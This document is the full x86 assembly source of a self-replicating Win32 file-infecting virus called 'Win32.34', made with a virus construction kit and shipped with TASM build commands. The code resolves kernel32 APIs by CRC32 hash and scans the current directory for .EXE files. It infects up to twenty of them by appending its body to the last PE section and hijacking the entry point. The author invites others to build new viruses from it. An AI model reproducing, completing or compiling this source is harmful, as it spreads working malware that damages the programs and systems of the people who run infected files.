              
;
;
; Win32.34 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.34
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 34
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 32
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
 sub edx, offset Delta
                                        ; mov ebp, edx
                                        ; clear ebp
 sub ebp, ebp
 add ebp, edx
 jmp KernelSearchStart


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov eax, offset APIOffsets
 add eax, ebp

 mov esi, ebp
 add esi, offset APINames


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; eax points to the offset

 call SearchAPI1
                                        ; add esi, 4
 dec esi
 add esi, 5d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [eax], edx
                                        ; add eax, 4
 dec eax
 add eax, 5d
 sub ebx, 1
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 and ecx, 0

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 mov eax, 80000000h or 40000000h
 push eax
 lea esi, [ebp+WFD_szFileName]

 push esi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
                                        ; mov ecx, 4
 mov ecx, 0
 add ecx, 4d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 cmp eax, 0
 je CloseFile
 push ebx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 sar ecx, 8d                            ; Trash
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [edx+3Ch]
 add eax, edx
                                        ; get File Alignment
 mov ebx, [eax+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
 mov esi, ebx
                                        ; get last section
                                        ; clear eax
 xor eax, eax
 mov ax, word ptr [esi+06h]
 sub eax, 1
 imul eax, eax, 28h
 add ebx, eax
                                        ; add ebx, 120
 dec ebx
 add ebx, 121d
 mov eax, dword ptr [esi+74h]
 clc
 rcl eax, 3
 add ebx, eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], ecx
                                        ; clear eax
 mov eax, -16080d
 add eax, 16080d

 add eax, [ebx+10h]
 adc edx, edx                           ; Trash
                                        ; mov edx, eax
                                        ; clear edx
 mov edx, 0
 add edx, eax
 add ebx, 14h
 add eax, [ebx]
 sub ebx, 14h
 push eax
 push edx
 pop ecx
 add ecx, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ecx
 mov ecx, [ebx+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add ecx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 push ecx
 pop dword ptr [ebp+AlignReg1]
 call Align
 xor dword ptr [ebp+Trash1], 1268672    ; Trash
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], ecx
 inc dword ptr [ebp+Trash1]             ; Trash
 mov ecx, dword ptr [ebx+0Ch]
 add ecx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '34'
                                        ; Append Virus
 pop edi
 or eax, 93916300d                      ; Trash
 lea eax, [ebp+Virus]
 xchg esi, eax

 mov edx, VirusSize
 xor ecx, 41192289d                     ; Trash
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edi

                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax
 sbb edx, 14d                           ; Trash



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 xor dword ptr [ebp+Trash1], 1169420    ; Trash
 add ecx,12345678h
 org $-4
 retBase dd 0h
 jmp ecx



;           [ ///// * Outbreak Procedure * \\\\\ ]

 add edx, ebx                           ; Trash

Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ecx

 push dword ptr [ebp+OldBase]
 pop eax

 mov dword ptr [ebp+retBase], eax
 sub dword ptr [ebp+Trash1], 487173     ; Trash

 adc edx, ebx                           ; Trash



;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov edi, ebp
 add edi, offset filemask

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
 rol ecx, 8d                            ; Trash
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 sub edi, edi
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 sub edx, edx
 add edx, [edi+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
                                        ; add edx, 4
 add edx, 4d
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; add edx, 4
 add edx, 4d
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], eax
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [eax]
                                        ; mov eax, edx
 push edx
 pop eax
                                        ; mov edi, edx
 mov edi, edx
 or ecx, 58882587d                      ; Trash
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], edi
 push esi
 cld
 or edx, ecx                            ; Trash

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov edx, dword ptr [ebp+APICRC32]
 sub edx, dword ptr [esi]
 test edx, edx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 mov edi, dword ptr [ebp+TempApisearch2]
 mov eax, dword ptr [ebp+NTableTemp]
                                        ; add eax, 4
 add eax, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
 and eax, edx                           ; Trash
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop edi
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [edi]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ecx]
 add ebx, dword ptr [ebp+KernelMZ]
 rol eax, 28d                           ; Trash
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]

 push ecx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]
 xchg esi, eax

 push esi
 mov ecx, dword ptr [ebp+FindHandle]
 xor eax, ebx                           ; Trash
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 push 276d
 pop ecx
 mov edi, ebp
 add edi, offset WFD_szFileName

                                        ; clear eax
 push 0
 pop eax
 rep stosb
 popad
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov edx, 45920250d                     ; Trash
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -39814d
 add edx, 39814d
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 ATableVA    dd 0h
 FindHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapAddress  dd 0h
 APICRC32    dd 0h
 AlignReg2   dd 0h
 OldBase     dd 400000h
 MapHandle   dd 0h
 db 'Win32.34 created by SnakeByte',0
 OTableVA    dd 0h
 NTableTemp  dd 0h
 filemask    db '*.ExE',0

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h

 TempApisearch2 dd 0h
 NewEIP      dd 0h
 InfCounter  dd 0h
 NTableVA    dd 0h
 AlignReg1   dd 0h
 KernelMZ    dd 0h
 FileHandle  dd 0h
 K32Trys     dd 0h
 NewSize     dd 0h
 counter     dw 0h
 OldEIP      dd 0h
 Trash1      dd 0h
 KernelPE    dd 0h
 TempAPI     dd 0h

 APINames:
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 068624A9Dh           ; CloseHandle
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 0797B49ECh           ; MapViewOfFile
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 08C892DDFh           ; CreateFileA
 dd 0AA700106h           ; FindNextFileA





;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edx, edi
 mov edx, edi
LenCRC:
                                        ; add edx, 1
 sub edx, -1d
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, edi
                                        ; mov esi, edx
                                        ; clear esi
 mov esi, 5960d
 sub esi, 5960d
 add esi, edx
                                        ; add esi, 1
 inc esi
 cld
                                        ; clear eax
 xor eax, eax
 sub eax, 1
                                        ; mov ebx, eax
                                        ; clear ebx
 mov ebx, 0
 add ebx, eax
NextByteCRC:
                                        ; clear edx
 push 0
 pop edx
                                        ; clear ecx
 sub ecx, ecx
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 xor dl, al
 mov al, ah
 mov ah, bl
 mov bl, bh
 mov bh, 8
NextBitCRC:
 shr cx, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor cx,0EDB8h
NoCRC:
 dec bh
jnz NextBitCRC
 xor eax, edx
 xor ebx, ecx
 dec esi
jnz NextByteCRC
 not ebx
 not eax
 mov edx, ebx
 rol edx, 16d
 mov dx, ax
 push edx
 pop dword ptr [ebp+APICRC32]
 popad
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea eax, [ebp+WFD_nFileSizeLow]
 adc edx, 4939143d                      ; Trash

 cmp dword ptr [eax], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; clear ecx
 sub ecx, ecx
 test ecx, ecx
 jz Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp edi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edi, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '34'
 jz Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [edi+16h]
 and bx, 0F000h
 mov edx, 57357856d                     ; Trash
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ecx, dword ptr [esp]
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 61778
 sub dword ptr [ebp+K32Trys], 1778d

GK1:                                    ; check for DOS-EXE Stub
                                        ; mov eax, -1
 mov eax, ( -1d xor 19d )
 xor eax, 19d
 and eax, dword ptr [ebp+K32Trys]
 or eax, eax
 jz NoKernel
                                        ; check for ZM
 movzx edx, word ptr [ecx]
 xor edx, 'ZM'
 jz CheckPE

GK2:
                                        ; mov edx, 65536
 mov edx, 65536d
 sub ecx, edx
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; check for EP
 movzx ebx, word ptr [edx]
 cmp ebx, 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 inc edx
 add edx, 21d
                                        ; clear ebx
 and ebx, 0
 mov bx, word ptr [edx]
 and bx, 0F000h
 cmp bx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 sub edx, 22d


KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], edx

 jmp GetApis

CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

